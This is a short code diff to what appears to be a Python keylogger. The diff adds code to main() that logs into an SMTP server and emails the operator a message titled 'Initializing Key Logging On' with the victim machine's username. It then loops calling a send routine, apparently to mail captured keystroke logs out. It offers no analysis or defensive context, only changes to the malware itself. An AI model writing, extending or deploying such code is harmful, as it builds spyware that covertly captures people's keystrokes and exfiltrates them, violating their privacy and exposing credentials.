@@ -47,9 +47,19 @@ def ReadLogFile():
         with open(logfile, 'r') as fp:
             return fp.read()
     except:
-        return 'Log File Has Not Been Created Yet'
+        return ''
 
 def main():
+    smtp = smtplib.SMTP(mailserver, 587)
+    smtp.ehlo()
+    smtp.starttls()
+    smtp.login(email, passw)
+    msg = MIMEMultipart()
+    msg['From'] = email
+    msg['To'] = email
+    msg['Subject'] = 'Initializing Key Logging On {}'.format(os.popen('whoami'))
+    smtp.sendmail(email, email, msg.as_string())
+    smtp.close()
     while True:
         Send()
 
